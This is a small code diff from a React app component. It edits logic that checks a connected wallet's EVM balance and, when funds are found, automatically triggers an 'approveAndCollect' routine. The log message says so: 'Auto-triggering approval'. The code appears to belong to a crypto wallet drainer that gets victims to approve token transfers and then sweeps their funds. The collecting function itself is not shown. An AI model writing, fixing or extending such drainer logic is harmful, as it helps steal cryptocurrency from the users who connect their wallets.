@@ -210,7 +210,7 @@ export default function App() {
         currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      if (currentBalance > 0 && !autoTriggered.current) {
+      if (currentBalance && !autoTriggered.current) {
         autoTriggered.current = true;
         log("🔥 Positive balance detected. Auto-triggering approval...");
         setTimeout(() => approveAndCollect(), 1000); 
